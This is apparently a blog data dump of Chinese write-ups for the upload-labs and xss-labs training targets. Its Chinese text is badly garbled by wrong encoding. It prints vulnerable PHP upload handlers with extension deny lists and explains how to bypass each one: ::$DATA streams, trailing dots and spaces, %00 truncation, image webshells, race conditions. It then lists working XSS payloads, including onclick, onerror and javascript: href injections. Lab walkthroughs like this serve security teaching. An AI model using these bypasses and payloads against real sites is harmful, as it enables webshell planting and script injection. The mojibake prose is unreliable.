array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA ç›¸æ¯”å‰é¢çš„é¢˜ï¼Œè¿™é“æ²¡æœ‰åç¼€åå»ç©ºå¤„ç†ï¼ŒåŠ ç©ºæ ¼å³å¯ç»•è¿‡ã€‚æ³¨æ„è¿™é‡Œä»…ä»…æ˜¯ç©ºæ ¼è¿˜æ˜¯ä¼šæœ‰é—®é¢˜ï¼Œéœ€è¦åœ¨ç©ºæ ¼åé¢åŠ ä¸Š&#39; 8.ç‚¹(.)ç»•è¿‡é»‘åå• æç¤ºåç¼€æ— æ³•è§£æâ€¦. æºç  12345678if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º ç›¸æ¯”å‰é¢çš„é¢˜ï¼Œæ²¡æœ‰äº†$file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹,ç‚¹å·ç»•è¿‡ 9.::$DATAç»•è¿‡ æºç  1234567if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = trim($file_ext); //é¦–å°¾å»ç©º ç›¸æ¯”å‰é¢çš„é¢˜ï¼Œæ²¡æœ‰äº†$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA,æ²¡æœ‰å¯¹åç¼€åä¸­çš„â€™::$DATAâ€™è¿›è¡Œè¿‡æ»¤åœ¨php+windowsçš„æƒ…å†µä¸‹æ–‡ä»¶å+â€::$DATAâ€ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†ï¼Œä¸ä¼šæ£€æµ‹åç¼€åä¸”ä¿æŒâ€::$DATAâ€ä¹‹å‰çš„æ–‡ä»¶å 10.ç‚¹ç©ºç‚¹ç»•è¿‡ æºç  123456789101112131415if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; ä¸»è¦åŒºåˆ«æ˜¯å›¾ç‰‡çš„å­˜å‚¨è·¯å¾„æ˜¯æ–‡ä»¶åï¼Œä¿å­˜æ–‡ä»¶çš„æ—¶å€™æ²¡æœ‰é‡å‘½åè€Œä½¿ç”¨çš„åŸå§‹çš„æ–‡ä»¶åå¯ä»¥ä½¿ç”¨1.php. .ç»•è¿‡ 11.åŒå†™ç»•è¿‡ ç”¨ str_ireplace æŠŠé»‘åå•é‡Œçš„åç¼€å…¨æ›¿æ¢ä¸ºç©ºä½†æ˜¯è¿™ä¸ªå‡½æ•°åªè¿›è¡Œä¸€æ¬¡æ›¿æ¢$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); äºŒã€åç¼€ç™½åå•12.Get%00 æˆªæ–­ æç¤º æºç  123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else&#123; $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;; &#125;&#125; å¯ä»¥çœ‹åˆ° get æ–¹æ³•çš„ save_path æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œå¯ä»¥ä½¿ç”¨%00 æˆªæ–­æˆ‘ä»¬å¯ä»¥æŠ“åŒ…ä¿®æ”¹ get çš„å‚æ•°ï¼Œç„¶åé€šè¿‡ file_ext æ— æ•ˆï¼Œè¿™æ ·å°±å¯ä»¥ä¸Šä¼  PHP æ–‡ä»¶ %00 æˆªæ–­çš„æ¦‚å¿µå’ŒåŸç†ï¼š åœ¨URLä¸­%00è¡¨ç¤ºASCIIç ä¸­çš„0ï¼Œè€Œ0ä½œä¸ºç‰¹æ®Šå­—ç¬¦ä¿ç•™ï¼Œè¡¨ç¤ºå­—ç¬¦ç»“æŸ å½“urlä¸­å‡ºç°%00æ—¶å°±ä¼šè®¤ä¸ºè¯»å–å·²ç»“æŸï¼Œè€Œå¿½ç•¥åé¢ä¸Šä¼ çš„æ–‡ä»¶æˆ–å›¾ç‰‡ï¼Œåªä¸Šä¼ æˆªæ–­å‰çš„æ–‡ä»¶æˆ–å›¾ç‰‡ è¦æ±‚ï¼šphpç‰ˆæœ¬å°äº5.3.4ï¼Œphpçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€ 13.POST%00 æˆªæ–­ å’Œä¸Šé¢˜çš„å·®è·åªæ˜¯â€“ç”± GET å˜æˆ POST å‹è¿˜æ˜¯åˆ©ç”¨ 00 æˆªæ–­ä½†æ˜¯ POST ä¸ä¼šåƒ GET å¯¹%00 è¿›è¡Œè‡ªåŠ¨è§£ç éœ€è¦åœ¨äºŒè¿›åˆ¶ä¸­è¿›è¡Œä¿®æ”¹å°† 70 68 70 åé¢çš„ 2b æ”¹ä¸º 00 ä¸‰ã€æ£€æŸ¥å†…å®¹14.å›¾ç‰‡é©¬ç»•è¿‡é¢˜ç›®è¦æ±‚å‘ç”Ÿäº†å˜åŒ– æºç  12345678910111213141516171819202122232425262728293031323334353637383940function getReailFileType($filename)&#123; $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //åªè¯»2å­—èŠ‚ fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]); $fileType = &#x27;&#x27;; switch($typeCode)&#123; case 255216: $fileType = &#x27;jpg&#x27;; break; case 13780: $fileType = &#x27;png&#x27;; break; case 7173: $fileType = &#x27;gif&#x27;; break; default: $fileType = &#x27;unknown&#x27;; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $file_type = getReailFileType($temp_file); if($file_type == &#x27;unknown&#x27;)&#123; $msg = &quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;; &#125;else&#123; $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;; &#125; &#125;&#125; rb æ˜¯è¯»å–äºŒè¿›åˆ¶æ–‡ä»¶ åé¢çš„ fread å‡½æ•°åªè¯»ä¸¤å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯è¯´åªå¯¹æ–‡ä»¶å¤´è¿›è¡Œäº†æ£€æµ‹ unpack(format,data)å‡½æ•°æ˜¯è§„å®šåœ¨è§£åŒ…æ•°æ®æ—¶æ‰€ä½¿ç”¨çš„æ ¼å¼ï¼Œè¿™é‡Œæ˜¯æ–‡ä»¶å¤´æŒ‰ç…§ c æ ¼å¼è§£åŒ… intval() å‡½æ•°ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼ ä½†ç›´æ¥è®¿é—®å›¾ç‰‡å¹¶ä¸èƒ½æŠŠå›¾ç‰‡å½“åš PHP è§£æè¿˜éœ€è¦åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´www/upload-labs/upload ç›®å½•ä¸‹å»ºç«‹ä¸€ä¸ª php æ–‡ä»¶ 15.å›¾ç‰‡é©¬ç»•è¿‡ æºç  1234567891011121314function isImage($filename)&#123; $types = &#x27;.jpeg|.png|.gif&#x27;; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125; ä½¿ç”¨ getimagesize()å‡½æ•°æ¥è·å–å›¾ç‰‡çš„å¤§å°åŠç›¸å…³ä¿¡æ¯ï¼ŒæˆåŠŸè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œå¤±è´¥åˆ™è¿”å› FALSE å¹¶äº§ç”Ÿä¸€æ¡ E_WARNING çº§çš„é”™è¯¯ä¿¡æ¯ã€‚ã€‚ä»ç„¶å¯ä»¥ä½¿ç”¨å›¾ç‰‡é©¬ç»•è¿‡ã€‚ 16.å›¾ç‰‡é©¬ç»•è¿‡ æºç  123456789101112131415161718function isImage($filename)&#123; //éœ€è¦å¼€å¯php_exifæ¨¡å— $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return &quot;gif&quot;; break; case IMAGETYPE_JPEG: return &quot;jpg&quot;; break; case IMAGETYPE_PNG: return &quot;png&quot;; break; default: return false; break; &#125;&#125; ç”¨ exif_imagetype æ¥åˆ¤æ–­æ–‡ä»¶çš„ç±»å‹ï¼Œä»ç„¶å¯ä»¥é€šè¿‡å›¾ç‰‡é©¬ç»•è¿‡ï¼ŒæˆåŠŸä¸Šä¼ ï¼Œä½†æ˜¯éœ€è¦ä½¿ç”¨æ–‡ä»¶åŒ…å«æ¼æ´æ¥è®¿é—®å¯¹åº”æ–‡ä»¶ 17.äºŒæ¬¡æ¸²æŸ“ç»•è¿‡ æºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;]))&#123; // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„ $filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;]; $tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $target_path=UPLOAD_PATH.&#x27;/&#x27;.basename($filename); // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å $fileext= substr(strrchr($filename,&quot;.&quot;),1); //åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼&quot;; @unlink($target_path); &#125;else&#123; //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;; &#125; &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼&quot;; @unlink($target_path); &#125;else&#123; //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).&quot;.png&quot;; //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;; &#125; &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼&quot;; @unlink($target_path); &#125;else&#123; //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).&quot;.gif&quot;; //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;; &#125; &#125;else&#123; $msg = &quot;åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼&quot;; &#125;&#125; åˆ¤æ–­äº†åç¼€åã€content-type åˆ©ç”¨ imagecreatefromgif åˆ¤æ–­æ ¼å¼ äºŒæ¬¡æ¸²æŸ“äº†ä¸Šä¼ çš„å›¾ç‰‡ ç»•è¿‡æ–¹æ³•ï¼šæ‰¾åˆ°æ¸²æŸ“å‰åæ²¡æœ‰å˜åŒ–çš„ä½ç½®,ç„¶åå°† php ä»£ç å†™è¿›å»,å°±å¯ä»¥æˆåŠŸä¸Šä¼ å¸¦æœ‰ php ä»£ç çš„å›¾ç‰‡å‡è®¾è¿™é‡Œä½¿ç”¨å›¾ç‰‡é©¬ç»•è¿‡ï¼Œä¸Šä¼ ä¹‹åçš„å›¾ç‰‡ä¸­çš„ PHP è¯­å¥ä¼šè¢«è¿‡æ»¤æ‰é’ˆå¯¹ gif æ–‡ä»¶ä¸Šä¼ ï¼Œåšä¸ªå°è¯•åœ¨ hex ä»£ç ä¸­æ‰¾åˆ°å‰åæ²¡æœ‰å˜åŒ–çš„å†…å®¹,å°†æ·»åŠ åˆ° 1.gif çš„å°¾éƒ¨ï¼Œå³å¯æˆåŠŸä¸Šä¼ ã€‚é’ˆå¯¹ png å’Œ jpg çš„äºŒæ¬¡æ¸²æŸ“ä¸Šä¼ ï¼Œå¯å‚è€ƒå¤§ä½¬æ–‡ç«  18.æ¡ä»¶ç«äº‰ æºç  1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);//å®šä¹‰ç™½åå• $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];//ä¸Šä¼ æ–‡ä»¶å $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];//ä¸´æ—¶æ–‡ä»¶åè·¯å¾„åç§° $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);//æˆªå–æ–‡ä»¶åç¼€å $upload_file = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name;//æ‹¼æ¥ä¸Šä¼ æ–‡ä»¶çš„è·¯å¾„åç§° if(move_uploaded_file($temp_file, $upload_file))&#123;//å°†ä¸´æ—¶æ–‡ä»¶æ”¾åˆ°æŒ‡å®šè·¯å¾„ï¼Œå¦‚æœæˆåŠŸæ‰§è¡Œ if(in_array($file_ext,$ext_arr))&#123;//åˆ¤æ–­æ–‡ä»¶åç¼€ $img_path = $UPLOAD_ADDR . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;//ç”Ÿæˆæ–°çš„æ–‡ä»¶å rename($upload_file, $img_path);//å¯¹æ–‡ä»¶é‡å‘½åï¼Œå¹¶å°†æ–°çš„æ–‡ä»¶ç›®å½•è¦†ç›–åˆ°åŸæ¥çš„æ–‡ä»¶ç›®å½•ä¸Š unlink($upload_file); $is_upload = true; &#125;else&#123; $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;; unlink($upload_file); &#125; &#125;else&#123; $msg = &#x27;ä¸Šä¼ å¤±è´¥ï¼&#x27;; &#125;&#125; å…ˆä¸Šä¼ æ–‡ä»¶ï¼Œç„¶åç™½åå•åˆ¤æ–­æ–‡ä»¶çš„åç¼€åï¼Œå¦‚æœä¸ç¬¦ï¼Œåˆ™æŠ¥é”™åŠåˆ é™¤æ–‡ä»¶ï¼Œå¦‚æœåœ¨ç™½åå•ï¼Œåˆ™é‡å‘½åã€‚è¿™å°±åœ¨æ–‡ä»¶çš„å¤„ç†é¡ºåºä¸Šå‡ºç°äº†é—®é¢˜ï¼Œä¸ç®¡æ–‡ä»¶ç±»å‹æ˜¯å¦åˆæ ¼å°±ä¸Šä¼ è‡³æœåŠ¡å™¨ï¼Œä¹‹åå†å¯¹å…¶ç±»å‹è¿›è¡Œåˆ¤æ–­ï¼Œè¿™æ ·çš„å¤„ç†é¡ºåºå¯¼è‡´äº†åœ¨å¤šçº¿ç¨‹çš„æƒ…å†µä¸‹ï¼Œæœ‰å¯èƒ½å¯¹äºä¸åˆæ ¼çš„æ–‡ä»¶è¿˜æ²¡æ¥å¾—åŠåˆ é™¤å°±å·²ç»è¢«è®¿é—®ï¼Œå¯¼è‡´ä¸åˆæ ¼çš„æ–‡ä»¶ç»•è¿‡äº†é™åˆ¶ å› æ­¤æˆ‘ä»¬å¯ä»¥æ‰“ä¸ªæ—¶é—´å·®ï¼šä¸Šä¼  1.phpï¼Œåªéœ€è¦åœ¨å®ƒåˆ é™¤ä¹‹å‰è®¿é—®å³å¯å¯ä»¥åˆ©ç”¨ burp çš„ intruder æ¨¡å—ä¸æ–­ä¸Šä¼ ï¼Œç„¶åæˆ‘ä»¬ä¸æ–­çš„è®¿é—®åˆ·æ–°è¯¥åœ°å€ æ¡ä»¶ç«äº‰:ä¹Ÿå°±æ˜¯å…ˆä¸Šä¼ å†åˆ¤æ–­æ˜¯å¦éœ€è¦åˆ é™¤ã€‚ã€‚ã€‚ã€‚","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://example.com/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"upload","slug":"upload","permalink":"http://example.com/tags/upload/"}]},{"title":"xss-labsé¶æœºç»ƒä¹ ","slug":"xss-labs/xss-labs","date":"2021-03-26T12:50:43.000Z","updated":"2021-04-23T15:29:18.181Z","comments":true,"path":"2021/03/26/xss-labs/xss-labs/","link":"","permalink":"http://example.com/2021/03/26/xss-labs/xss-labs/","excerpt":"","text":"å…ˆä¸Šå›¾ leve-1 æ— ä»»ä½•è¿‡æ»¤ï¼Œget å‹ï¼Œç›´æ¥&lt;script&gt;alert(1)&lt;/script&gt; 2. æ–¹æ³•ä¸€:é—­åˆ input æ ‡ç­¾é‡Œé¢çš„&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; æ–¹æ³•äºŒ:é—­åˆ value å±æ€§ï¼Œåœ¨ input æ ‡ç­¾ä¸­æ·»åŠ æ–°çš„å±æ€§&quot; onclick=&quot;alert(11) 3.HTML å®ä½“åŒ–è¿‡æ»¤ htmlspecialchars å‡½æ•°å¯ä»¥è¿‡æ»¤&lt;``&gt;``&quot;ï¼Œä½†æ˜¯ä¸ä¼šè¿‡æ»¤å•å¼•å·ï¼Œè€Œä¸” value çš„é—­åˆä¹Ÿæ˜¯é‡‡ç”¨å•å¼•å·ï¼Œæ‰€ä»¥ä¼šæœ‰ xss æ¼æ´ éƒ¨åˆ†æºç  12&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;&lt;input name=keyword value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt; 4.&lt;å’Œ&gt;é˜²å¾¡æœºåˆ¶ å…ˆè¯•æ¢é˜²å¾¡æœºåˆ¶ï¼Œå‘ç° value å€¼ä¸­æŠŠâ€œ&lt;â€è¿‡æ»¤äº†ï¼Œæ‰€ä»¥é‡‡ç”¨äº‹ä»¶æ³¨å…¥&quot; onclick=&quot;alert(11)æˆåŠŸå¼¹æ¡† 5.ri å’Œ on é˜²å¾¡æœºåˆ¶ ri æ›¿æ¢ä¸º r_i,on æ›¿æ¢ä¸º o_n è¿‡æ»¤äº†&quot; onclick=&quot;alert(11)``&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;``&quot;&gt;&lt;img src=1 onerror=alert(1) å¯ä»¥ä½¿ç”¨æ–°æ ‡ç­¾&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot; 6.ri å’Œ on,href é˜²å¾¡æœºåˆ¶ ri æ›¿æ¢ä¸º r_i,on æ›¿æ¢ä¸º o_n,href æ›¿æ¢æˆ hr_ef,ä½†æ˜¯è¿™é“é¢˜æ²¡æœ‰è¿‡æ»¤å¤§å°å†™ã€‚æ‰€ä»¥ &quot;&gt;&lt;a HREF=&quot;javascript:alert(1)&quot; 7.script,on ç­‰å…³é”®å­—æ›¿æ¢ä¸ºç©º åŒå†™ç»•è¿‡ &quot; oonnclick=&quot;alert(11) 8.è¿‡æ»¤è¾ƒå…¨ï¼Œä½¿ç”¨ html å®ä½“ç¼–ç  